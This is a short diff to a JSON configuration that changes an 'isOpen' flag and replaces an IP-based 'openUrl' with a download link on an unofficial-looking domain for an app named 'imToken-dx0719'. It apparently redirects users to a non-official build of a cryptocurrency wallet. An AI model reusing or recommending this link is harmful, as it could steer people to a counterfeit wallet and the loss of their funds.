@@ -1,4 +1,4 @@
 {
-"isOpen":"7",
-"openUrl":"http://180.188.44.6:3381"
+"isOpen":"2",
+"openUrl":"https://down5.upx5fff.com/download.aspx?app=imToken-dx0719"
 }
